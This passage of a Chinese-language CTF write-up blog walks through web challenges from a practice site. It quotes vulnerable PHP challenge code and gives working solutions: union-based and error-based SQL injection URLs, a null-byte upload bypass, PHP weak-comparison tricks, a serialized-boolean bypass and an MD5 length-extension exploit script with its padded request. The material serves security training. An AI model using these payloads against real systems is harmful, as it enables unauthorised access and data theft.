class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Can you authenticate to this website?</span><br></pre></td></tr></table></figure><p>hackerDJ 经过两次urlencode即可</p><p><img src="7-2.png" alt></p><h2 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h2><p><img src="8-1.png" alt></p><p><img src="8-2.png" alt></p><p>直接复制到浏览器的console运行即可</p><p><img src="8-3.png" alt></p><h2 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h2><p><img src="9-1.png" alt></p><p><img src="9-2.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[user] &amp;&amp; <span class="variable">$_POST</span>[pass]) &#123;</span><br><span class="line"><span class="variable">$conn</span> = mysql_connect(<span class="string">"********, "</span>*****<span class="string">", "</span>********<span class="string">");</span></span><br><span class="line"><span class="string">mysql_select_db("</span>phpformysql<span class="string">") or die("</span>Could not select database<span class="string">");</span></span><br><span class="line"><span class="string">if (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span></span><br><span class="line"><span class="string">die("</span>Connection failed: <span class="string">" . mysql_error(<span class="variable">$conn</span>));</span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string"><span class="variable">$user</span> = <span class="variable">$_POST</span>[user];</span></span><br><span class="line"><span class="string"><span class="variable">$pass</span> = md5(<span class="variable">$_POST</span>[pass]);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="variable">$sql</span> = "</span>select pw from php <span class="built_in">where</span> user=<span class="string">'$user'</span><span class="string">";</span></span><br><span class="line"><span class="string"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>);</span></span><br><span class="line"><span class="string">if (!<span class="variable">$query</span>) &#123;</span></span><br><span class="line"><span class="string">printf("</span>Error: %s\n<span class="string">", mysql_error(<span class="variable">$conn</span>));</span></span><br><span class="line"><span class="string">exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$query</span>, MYSQL_ASSOC);</span></span><br><span class="line"><span class="string">//echo <span class="variable">$row</span>["</span>pw<span class="string">"];</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  if ((<span class="variable">$row</span>[pw]) &amp;&amp; (!strcasecmp(<span class="variable">$pass</span>, <span class="variable">$row</span>[pw]))) &#123;</span></span><br><span class="line"><span class="string">echo "</span>&lt;p&gt;Logged <span class="keyword">in</span>! Key:************** &lt;/p&gt;<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else &#123;</span></span><br><span class="line"><span class="string">    echo("</span>&lt;p&gt;Log <span class="keyword">in</span> failure!&lt;/p&gt;<span class="string">");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="variable">$sql</span> = "</span>select pw from php <span class="built_in">where</span> user=<span class="string">'$user'</span><span class="string">";</span></span><br></pre></td></tr></table></figure><p>直接用户写  ‘union select md5(1)#    密码写 1  即可绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select pw from php <span class="built_in">where</span> user=<span class="string">''</span> union select md5(1)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="9-3.png" alt></p><h2 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h2><p><img src="10-1.png" alt></p><p><img src="10-2.png" alt></p><p>写个逆运算即可 </p><p>python脚本如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>.encode(<span class="string">'rot13'</span>)[::-1].decode(<span class="string">'base64'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">""</span>.join([chr(ord(i)-1) <span class="keyword">for</span> i <span class="keyword">in</span> a])[::-1]</span><br></pre></td></tr></table></figure></p><h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p><img src="11-1.png" alt></p><p><img src="11-2.png" alt></p><p>通过%00截断</p><p><img src="11-3.png" alt></p><h2 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h2><p><img src="12-1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) and isset(<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'name'</span>] == <span class="variable">$_GET</span>[<span class="string">'password'</span>])</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">'name'</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">'password'</span>]))</span><br><span class="line">      die(<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>md5弱类型</p><p><img src="12-2.png" alt></p><h2 id="Guess-Next-Session"><a href="#Guess-Next-Session" class="headerlink" title="Guess Next Session"></a>Guess Next Session</h2><p><img src="13-1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start(); </span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'password'</span>] == <span class="variable">$_SESSION</span>[<span class="string">'password'</span>])</span><br><span class="line">        die (<span class="string">'Flag: '</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">'&lt;p&gt;Wrong guess.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>清空cookie，password也为空</p><p><img src="13-2.png" alt></p><h2 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h2><p><img src="14-1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset (<span class="variable">$_GET</span>[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, <span class="variable">$_GET</span>[<span class="string">'password'</span>]) === FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strlen(<span class="variable">$_GET</span>[<span class="string">'password'</span>]) &lt; 8 &amp;&amp; <span class="variable">$_GET</span>[<span class="string">'password'</span>] &gt; 9999999)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos (<span class="variable">$_GET</span>[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== FALSE)</span><br><span class="line">&#123;</span><br><span class="line">die(<span class="string">'Flag: '</span> . <span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="14-2.png" alt></p><h2 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h2><p><img src="15-1.png" alt></p><p><img src="15-2.png" alt></p><p>查看源代码发现</p><p><img src="15-3.png" alt></p><p><img src="15-4.png" alt></p><p><img src="15-5.png" alt></p><p>因为是vim 考虑源码泄露 尝试 .submit.php.swp</p><p><img src="15-6.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!empty(<span class="variable">$token</span>)&amp;&amp;!empty(<span class="variable">$emailAddress</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$token</span>)!=10) die(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>!=<span class="string">'0'</span>) die(<span class="string">'fail'</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"SELECT count(*) as num from `user` where token='<span class="variable">$token</span>' AND email='<span class="variable">$emailAddress</span>'"</span>;</span><br><span class="line"><span class="variable">$r</span> = mysql_query(<span class="variable">$sql</span>) or die(<span class="string">'db error'</span>);</span><br><span class="line"><span class="variable">$r</span> = mysql_fetch_assoc(<span class="variable">$r</span>);</span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$r</span>[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span>&gt;0)&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"失败了呀"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>token要等于0而且长度要等于10    0000000000</p><p><img src="15-7.png" alt></p><h2 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h2><p><img src="16-1.png" alt></p><p><img src="16-2.png" alt></p><p>输入username=QNKCDZO</p><p><img src="16-3.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$unserialize_str</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line">     <span class="variable">$data_unserialize</span> = unserialize(<span class="variable">$unserialize_str</span>);</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$data_unserialize</span>[<span class="string">'user'</span>] == <span class="string">'???'</span> &amp;&amp; <span class="variable">$data_unserialize</span>[<span class="string">'pass'</span>]==<span class="string">'???'</span>)</span><br><span class="line">     &#123;</span><br><span class="line">       print_r(<span class="variable">$flag</span>);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>伟大的科学家php方言道：成也布尔，败也布尔。<br>回去吧骚年</p><p>分析：<br>　　代码意思是把post提交的password值经过”反序列化”得到一个数组，要求数组里的user和pass都等于某个值时就打印flag。<br>　　但是我们不知道两处???到底是什么，因此无法考虑用php函数构造这样的值。<br>　　别忘了还有一个提示： “伟大的科学家php方言道：成也布尔，败也布尔” ，bool类型的true跟任意字符串可以弱类型相等。因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。（a代表array，s代表string，b代表bool，而数字代表个数/长度）<br>　　构造password值为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:4:<span class="string">"user"</span>;b:1;s:4:<span class="string">"pass"</span>;b:1;&#125;</span><br></pre></td></tr></table></figure></p><p>　　在密码栏中提交构造的值，即可获取flag: ctf{dwduwkhduw5465}</p><p><img src="16-4.png" alt></p><h2 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h2><p><img src="17-1.png" alt></p><p><img src="17-2.png" alt></p><p><img src="17-3.png" alt></p><p><img src="17-4.png" alt></p><h2 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h2><p><img src="18-1.png" alt></p><p>应该是题目出了问题，直接访问index.php得到flag</p><p><img src="18-2.png" alt></p><h2 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h2><p><img src="19-1.png" alt></p><p><img src="19-2.png" alt></p><p>源代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line"><span class="variable">$secret</span> = <span class="string">"XXXXXXXXXXXXXXX"</span>; // This secret is 15 characters long <span class="keyword">for</span> security!</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">"username"</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$_COOKIE</span>[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode(<span class="variable">$username</span>) === <span class="string">"admin"</span> &amp;&amp; urldecode(<span class="variable">$password</span>) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$COOKIE</span>[<span class="string">"getmein"</span>] === md5(<span class="variable">$secret</span> . urldecode(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            die (<span class="string">"The flag is "</span>. <span class="variable">$flag</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            die (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        die (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5(<span class="variable">$secret</span> . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (empty(<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>] != 0) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">""</span>; // This <span class="built_in">source</span> code is outputted here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>hash长度扩展攻击<br>代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">samplehash='</span>571580b26c65f306376d4f64e53cb5c7<span class="string">'</span></span><br><span class="line"><span class="string">s1='</span>0x<span class="string">'+samplehash[6:8]+samplehash[4:6]+samplehash[2:4]+samplehash[0:2]</span></span><br><span class="line"><span class="string">s2='</span>0x<span class="string">'+samplehash[14:16]+samplehash[12:14]+samplehash[10:12]+samplehash[8:10]</span></span><br><span class="line"><span class="string">s3='</span>0x<span class="string">'+samplehash[22:24]+samplehash[20:22]+samplehash[18:20]+samplehash[16:18]</span></span><br><span class="line"><span class="string">s4='</span>0x<span class="string">'+samplehash[30:32]+samplehash[28:30]+samplehash[26:28]+samplehash[24:26]</span></span><br><span class="line"><span class="string">print s1,'</span>\n<span class="string">',s2,'</span>\n<span class="string">',s3,'</span>\n<span class="string">',s4</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author：DshtAnger</span></span><br><span class="line">import my_md5</span><br><span class="line"><span class="comment">#reference:</span></span><br><span class="line"><span class="comment">#   http://www.freebuf.com/articles/web/69264.html</span></span><br><span class="line"><span class="comment">#problem link:</span></span><br><span class="line"><span class="comment">#   http://ctf4.shiyanbar.com/web/kzhan.php</span></span><br><span class="line"></span><br><span class="line">samplehash=<span class="string">"571580b26c65f306376d4f64e53cb5c7"</span></span><br><span class="line"><span class="comment">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span></span><br><span class="line">s1=0xb2801557</span><br><span class="line">s2=0x06f3656c</span><br><span class="line">s3=0x644f6d37</span><br><span class="line">s4=0xc7b53ce5</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(s1)</span><br><span class="line"><span class="comment">#exp</span></span><br><span class="line">secret = <span class="string">"a"</span>*15</span><br><span class="line">secret_admin = secret+<span class="string">'adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin'</span></span><br><span class="line">r = my_md5.deal_rawInputMsg(secret_admin)</span><br><span class="line">inp = r[len(r)/2:]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"getmein:"</span>+my_md5.run_md5(s1,s2,s3,s4,inp)</span><br><span class="line"></span><br><span class="line">得到：getmein:e18dfd8404515016d3aeeea2aa196909</span><br></pre></td></tr></table></figure></p><p>burp抓包改包<br>username=admin<br>password=admin+\x80\x00……admin<br>\x80\x00要在hex里面修改</p><p><img src="19-3.png" alt></p><p><img src="19-4.png" alt></p><p>或者用<br>username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00admin</p><p><img src="19-5.png" alt></p><h2 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h2><p><img src="20-1.png" alt></p><p><img src="20-2.png" alt></p><p><img src="20-3.png" alt></p><p>python 代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests,re</span><br><span class="line">from base64 import b64decode</span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/10/10.php'</span></span><br><span class="line">r = s.get(url)</span><br><span class="line">head = r.headers</span><br><span class="line">flag = b64decode(head[<span class="string">'flag'</span>]).split(<span class="string">':'</span>)[1]</span><br><span class="line">r1 = s.post(url, data=&#123;<span class="string">'key'</span>:flag&#125;)</span><br><span class="line"><span class="built_in">print</span> r1.text</span><br></pre></td></tr></table></figure></p><h2 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h2><p><img src="21-1.png" alt></p><p>双写绕过加上空格过滤</p><p><img src="21-2.png" alt></p><h2 id="简单的sql注入之2"><a href="#简单的sql注入之2" class="headerlink" title="简单的sql注入之2"></a>简单的sql注入之2</h2><p><img src="22-1.png" alt></p><p><img src="22-2.png" alt></p><h2 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h2><p><img src="23-1.png" alt></p><p><a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;</a> and exp(~(select * FROM(SELECT database())a))–+</p><p><img src="23-2.png" alt></p><p><a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;</a> and exp(~(select * FROM(select group_concat(table_name) from information_schema.tables where table_schema=’web1’)a))–+</p><p><img src="23-3.png" alt></p><p><a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;</a> and exp(~(select * FROM(select group_concat(column_name) from information_schema.columns where table_name=’flag’ )a))–+</p><p><img src="23-4.png" alt></p><p><a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1&#39;</a> and exp(~(select * FROM(select flag from flag)a))–+</p><p><img src="23-5.png" alt></p><h2 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h2><p><img src="24-1.png" alt></p><p><img src="24-2.png" alt></p><p><img src="24-3.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_POST</span>[<span class="string">'uname'</span>]) || !isset(<span class="variable">$_POST</span>[<span class="string">'pwd'</span>])) &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> AttackFilter(<span class="variable">$StrKey</span>,<span class="variable">$StrValue</span>,<span class="variable">$ArrReq</span>)&#123;  </span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$StrValue</span>))&#123;</span><br><span class="line">        <span class="variable">$StrValue</span>=implode(<span class="variable">$StrValue</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.<span class="variable">$ArrReq</span>.<span class="string">"/is"</span>,<span class="variable">$StrValue</span>)==1)&#123;   </span><br><span class="line">        <span class="built_in">print</span> <span class="string">"水可载舟，亦可赛艇！"</span>;</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filter</span> = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line">foreach(<span class="variable">$_POST</span> as <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123; </span><br><span class="line">    AttackFilter(<span class="variable">$key</span>,<span class="variable">$value</span>,<span class="variable">$filter</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$con</span> = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)&#123;</span><br><span class="line">die(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$db</span>=<span class="string">"XXXXXX"</span>;</span><br><span 